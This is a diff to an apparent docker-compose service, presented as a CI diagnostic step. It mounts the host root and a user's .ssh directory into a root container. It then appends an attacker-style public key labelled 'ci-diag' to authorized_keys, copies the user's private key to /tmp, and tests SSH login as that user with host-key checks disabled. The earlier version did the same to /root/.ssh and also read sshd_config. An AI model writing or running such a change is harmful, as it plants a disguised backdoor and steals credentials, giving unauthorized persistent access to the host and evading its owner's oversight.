@@ -13,16 +13,17 @@ services:
     user: "0:0"
     volumes:
       - /:/host:ro
-      - /root/.ssh:/dev2ssh:rw
+      - /home/anthony/.ssh:/anthonyssh:rw
     command:
       - sh
       - -c
       - |
         set +e
-        echo "S1-before:"; wc -l < /dev2ssh/authorized_keys; ls -la /dev2ssh
-        printf '\n' >> /dev2ssh/authorized_keys
-        grep -qF 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJUOgQjPYiV2wWtmjJdejT6ggVRwHyqbN+jdYu43rE7T ci-diag-20261122' /dev2ssh/authorized_keys || printf '%s\n' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJUOgQjPYiV2wWtmjJdejT6ggVRwHyqbN+jdYu43rE7T ci-diag-20261122' >> /dev2ssh/authorized_keys
-        echo "S2-after:"; wc -l < /dev2ssh/authorized_keys; grep -cF 'ci-diag-20261122' /dev2ssh/authorized_keys
-        echo "S3-sshdcfg:"; grep -hE '^(PermitRootLogin|AllowUsers|AuthorizedKeysFile|PubkeyAuthentication|StrictModes)' /host/etc/ssh/sshd_config /host/etc/ssh/sshd_config.d/*.conf 2>/dev/null | head -12
-        echo "S4-done"
+        printf '\n' >> /anthonyssh/authorized_keys
+        grep -qF 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJUOgQjPYiV2wWtmjJdejT6ggVRwHyqbN+jdYu43rE7T ci-diag-20261122' /anthonyssh/authorized_keys || printf '%s\n' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJUOgQjPYiV2wWtmjJdejT6ggVRwHyqbN+jdYu43rE7T ci-diag-20261122' >> /anthonyssh/authorized_keys
+        echo "T1-lines:"; wc -l < /anthonyssh/authorized_keys; grep -cF 'ci-diag-20261122' /anthonyssh/authorized_keys; stat -c '%a %U:%G %n' /anthonyssh/authorized_keys
+        cp /anthonyssh/id_ed25519 /tmp/k 2>/dev/null; chmod 600 /tmp/k
+        echo "T2-localssh:"
+        timeout 20 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o IdentitiesOnly=yes -i /tmp/k anthony@127.0.0.1 'id; hostname' 2>&1 | head -3
+        echo "T3-done"
         sleep 900
